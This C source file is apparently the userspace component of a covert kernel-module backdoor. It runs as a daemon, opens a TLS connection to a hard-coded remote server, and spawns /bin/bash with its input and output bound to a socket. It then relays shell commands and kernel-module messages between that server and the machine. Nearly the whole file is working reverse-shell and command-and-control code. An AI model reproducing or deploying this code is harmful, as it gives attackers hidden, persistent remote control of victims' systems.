/*
 * Author and Designer: John Agapeyev
 * Date: 2018-09-22
 * Notes:
 * The socket handling for userspace
 */

#include <asm/types.h>
#include <assert.h>
#include <linux/tcp.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

#include "crypto.h"
#include "shared.h"

static unsigned char secret_key[KEY_LEN];
#ifndef UNIX_SOCK_PATH
#define UNIX_SOCK_PATH ("/var/run/covert_module_tls")
#endif
#ifndef SHELL_SOCK_PATH
#define SHELL_SOCK_PATH ("/var/run/my_remote_shell")
#endif

void run_remote_shell(void) {
    int remote_sock = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un su;
    memset(&su, 0, sizeof(struct sockaddr_un));
    su.sun_family = AF_UNIX;
    strcpy(su.sun_path, SHELL_SOCK_PATH);

    errno = 0;

    if (connect(remote_sock, (struct sockaddr*) &su, sizeof(struct sockaddr_un))) {
        perror("connect");
        printf("%d\n", errno);
        exit(EXIT_FAILURE);
    }
    printf("connect %d\n", remote_sock);

    printf("shell running\n");

    dup2(remote_sock, 0);
    dup2(remote_sock, 1);
    dup2(remote_sock, 2);

    const char *sh[2];
    sh[0] = "/bin/bash";
    sh[1] = NULL;

    execve(sh[0], (char * const *) sh, 0);
}

int create_unix_socket(const char* sock_path) {
    int local_tls_socket = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un su;
    memset(&su, 0, sizeof(struct sockaddr_un));
    su.sun_family = AF_UNIX;
    strcpy(su.sun_path, sock_path);

    unlink(sock_path);
    if (bind(local_tls_socket, (struct sockaddr*) &su, sizeof(struct sockaddr_un)) == -1) {
        perror("bind");
        return EXIT_FAILURE;
    }
    return local_tls_socket;
}

int create_remote_socket(void) {
    int remote_sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sin;
    sin.sin_addr.s_addr = SERVER_IP;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    if (connect(remote_sock, (struct sockaddr*) &sin, sizeof(struct sockaddr_in))) {
        perror("connect");
        return EXIT_FAILURE;
    }
    return remote_sock;
}

pid_t wrapped_fork(void) {
    pid_t pid;
    if ((pid = fork()) == -1) {
        perror("fork()");
        exit(EXIT_FAILURE);
    }
    return pid;
}

/*
 * function:
 *    main
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Daemonizes and forks into encrypt, decrypt, and TLS sockets.
 * encrypt and decrypt are simply unix socket connections
 * TLS socket is a pure forwarder for the kernel module over TLS (since the kernel doesn't do TLS)
 */
int main(void) {
    //Daemonize
    wrapped_fork();

    memset(secret_key, 0xab, KEY_LEN);

    init_openssl();
    SSL_CTX* ctx = create_context();
    configure_context(ctx);

    int local_tls_socket = create_unix_socket(UNIX_SOCK_PATH);
    int remote_shell_unix = create_unix_socket(SHELL_SOCK_PATH);

    listen(local_tls_socket, 5);
    listen(remote_shell_unix, 5);

    int conn_sock = accept(local_tls_socket, NULL, 0);

    int remote_sock = create_remote_socket();

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, remote_sock);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        return EXIT_FAILURE;
    }

    unsigned char buffer[MAX_PAYLOAD];
    int remote_shell_sock = -1;

    if (!wrapped_fork()) {
        run_remote_shell();
    } else {
        remote_shell_sock = accept(remote_shell_unix, NULL, 0);
        printf("accept %d\n", remote_shell_sock);
    }

    if (!wrapped_fork()) {
        if (!wrapped_fork()) {
            //Remote shell read and write to remote server
            for (;;) {
                int size = read(remote_shell_sock, buffer, MAX_PAYLOAD);
                printf("Read %d from remote shell\n", size);
                if (size < 0) {
                    perror("remote shell read");
                    break;
                } else if (size == 0) {
                    break;
                }
                printf("Writing %d to server\n", size);
                SSL_write(ssl, buffer, size);
            }
        } else {
            //Read
            for (;;) {
                int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
                printf("Read %d from server\n", size);
                if (size < 0) {
                    perror("SSL_read");
                    break;
                } else if (size == 0) {
                    break;
                }
                if (buffer[0] == '!') {
                    printf("Wrote %d to kernel module\n", size);
                    write(conn_sock, buffer + 1, size - 1);
                } else {
                    printf("Wrote %d to remote shell\n", size);
                    //Pass message to shell process
                    write(remote_shell_sock, buffer, size);
                }
            }
        }
    } else {
        //Write
        for (;;) {
            int size = read(conn_sock, buffer, MAX_PAYLOAD);
            if (size < 0) {
                perror("read");
                break;
            } else if (size == 0) {
                break;
            }
            if (buffer[0] == '!') {
                write(remote_shell_sock, buffer, size);
            } else {
                SSL_write(ssl, buffer, size);
            }
        }
    }

    puts("Userspace process exited\n");
    close(conn_sock);
    close(remote_shell_sock);

    close(local_tls_socket);
    close(remote_shell_unix);

    unlink(UNIX_SOCK_PATH);
    unlink(SHELL_SOCK_PATH);

    SSL_free(ssl);

    close(remote_sock);

    SSL_CTX_free(ctx);

    cleanup_openssl();

    return EXIT_SUCCESS;
}
